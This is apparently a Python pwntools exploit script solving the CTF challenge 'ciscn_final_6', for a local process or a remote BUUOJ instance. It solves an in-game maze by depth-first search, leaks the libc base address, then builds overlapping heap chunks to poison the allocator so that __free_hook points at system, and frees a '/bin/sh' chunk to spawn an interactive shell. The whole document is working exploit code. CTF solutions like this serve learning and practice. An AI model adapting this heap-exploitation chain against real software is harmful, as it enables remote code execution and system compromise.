import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_final_6')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_final_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',28982)
			elf=ELF('./ciscn_final_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def start(name, ops):
			io.sendlineafter('> ', '1')
			io.sendafter('what\'s your name?\n', name)
			io.sendlineafter('input you ops count\n', str(len(ops)))
			io.sendafter('ops: ', ops)


		def store(idx, ifComment, size, comment):
			io.sendlineafter('> ', '3')
			io.sendafter('any comment?\n', ifComment)
			io.sendlineafter('comment size?\n', str(size))
			io.sendafter('plz input comment\n', comment)


		def delete(idx) :
			io.sendlineafter('> ', '4')
			io.sendlineafter('index?\n', str(idx))

		def look_map(a) :
			for i in range(len(a)) :
				print a[i]

		def dfs(Vmap,x,y,ppp) :
			global pay
			if Vmap[41][42:43]=='x' :
				return
			if x==41 and y==42:
				Vmap[x]=Vmap[x][:y]+'x'+Vmap[x][y+1:]
				pay=ppp
				flag=1
				look_map(Vmap)
				return

			if Vmap[x][y:y+1]=='x' :
				return

			if Vmap[x][y:y+1]==' ' :
				Vmap[x]=Vmap[x][:y]+'x'+Vmap[x][y+1:]
				dfs(Vmap,x+1,y,ppp+'s')
				dfs(Vmap,x,y+1,ppp+'d')
				dfs(Vmap,x,y-1,ppp+'a')
				dfs(Vmap,x-1,y,ppp+'w')
				Vmap[x]=Vmap[x][:y]+' '+Vmap[x][y+1:]







				
		io.sendlineafter('> ','9')
		io.recvuntil('maze size:44, start(2,1), end(41,42)\n')
		game=io.recvuntil('\n0. resume\n',drop=True).split('\n')
		game[2]=game[2][:1]+'x'+game[2][2:]
		mapp=game
		flag=0
		dfs(mapp,2,2,'d')
		print pay
		pay+='d'
		start('keer\n',pay)
		io.recvuntil('0x')
		libc_base=int(io.recv(12),16)-libc.sym['malloc']
		libc.address=libc_base
		store(0, 'y', 0x20, 'keer\n')
		start('keer\n','keer')
		store(1, 'y', 0x20, 'keer\n')
		start('keer\n','keer')
		store(2, 'y', 0x20, 'keer\n')
		start('keer\n','keer')
		store(3, 'y', 0x20, 'keer\n')
		delete(0)
		delete(1)
		delete(2)
		delete(3)
		start('keer\n', 'keer\n')
		store(0, 'y', 0x4f8, 'keer\n')
		start('keer\n', 'keer\n')
		store(1, 'y', 0x68, 'keer\n')
		start('keer\n', 'keer\n')
		store(2, 'y', 0x88, 'keer\n')
		start('keer\n', 'keer\n')
		store(3, 'y', 0x4f8, 'keer\n')
		start('keer\n', 'keer\n')
		store(4, 'y', 0x40, '/bin/sh\x00\n')
		delete(2)
		start('keer\n', 'keer\n')
		store(2, 'y', 0x88, '\x00'*0x80+p64(0x600))
		delete(0)
		delete(3)
		delete(1)
		start('keer\n', 'keer\n')
		store(0, 'y', 0x600, '\x00'*0x4f8+p64(0x71)+p64(libc.sym['__free_hook'])+'\n')
		start('keer\n', 'keer\n')
		store(1, 'y', 0x68, 'keer\n')
		start('keer\n', 'keer\n')
		store(3, 'y', 0x68,p64(libc.sym['system'])+'\n')
		delete(4)
		


		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue